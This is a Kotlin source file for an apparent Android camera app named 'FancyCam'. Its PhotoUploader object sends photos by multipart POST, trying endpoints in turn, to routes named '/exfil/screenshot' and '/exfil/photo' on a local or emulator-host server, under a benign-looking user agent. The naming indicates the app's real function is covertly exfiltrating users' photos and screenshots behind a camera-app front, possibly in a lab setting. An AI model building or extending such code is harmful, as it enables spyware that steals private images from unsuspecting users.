package com.example.fancycam

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object PhotoUploader {
    private const val TAG = "PhotoUploader"

    val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    // Primary (adb reverse mapped) and fallback (Android emulator host alias)
    val ENDPOINTS = listOf(
        "http://127.0.0.1:5000/exfil/screenshot",
        "http://10.0.2.2:5000/exfil/screenshot",
        "http://127.0.0.1:5000/exfil/photo",
        "http://10.0.2.2:5000/exfil/photo"
    )

    data class UploadResult(
        val success: Boolean,
        val serverFilename: String = "",
        val message: String = "",
        val endpointUsed: String = ""
    )

    suspend fun uploadPhoto(file: File): UploadResult = withContext(Dispatchers.IO) {
        uploadPhotoSync(file)
    }

    fun uploadPhotoSync(file: File): UploadResult {
        if (!file.exists() || file.length() == 0L) {
            return UploadResult(false, message = "File does not exist or is empty")
        }

        var lastError = "Could not reach server"

        for (endpoint in ENDPOINTS) {
            try {
                Log.d(TAG, "Uploading ${file.name} (${file.length()} bytes) to $endpoint")

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "photo",
                        file.name,
                        file.asRequestBody("image/jpeg".toMediaType())
                    )
                    .build()

                val request = Request.Builder()
                    .url(endpoint)
                    .post(requestBody)
                    .addHeader("User-Agent", "FancyCam-Android/1.0")
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val body = response.body?.string().orEmpty()
                        var serverFile = ""
                        try {
                            val json = JSONObject(body)
                            serverFile = json.optString("filename", "")
                        } catch (e: Exception) {
                            Log.w(TAG, "Non-JSON response body: $body")
                        }
                        Log.i(TAG, "Photo ${file.name} successfully uploaded to $endpoint as $serverFile")
                        return UploadResult(
                            success = true,
                            serverFilename = serverFile,
                            message = "Uploaded successfully",
                            endpointUsed = endpoint
                        )
                    } else {
                        lastError = "Server HTTP error ${response.code}"
                        Log.w(TAG, "Endpoint $endpoint responded with HTTP ${response.code}")
                    }
                }
            } catch (e: Exception) {
                lastError = e.localizedMessage ?: "Connection error"
                Log.w(TAG, "Endpoint $endpoint failed: $lastError")
            }
        }

        return UploadResult(false, message = lastError)
    }
}
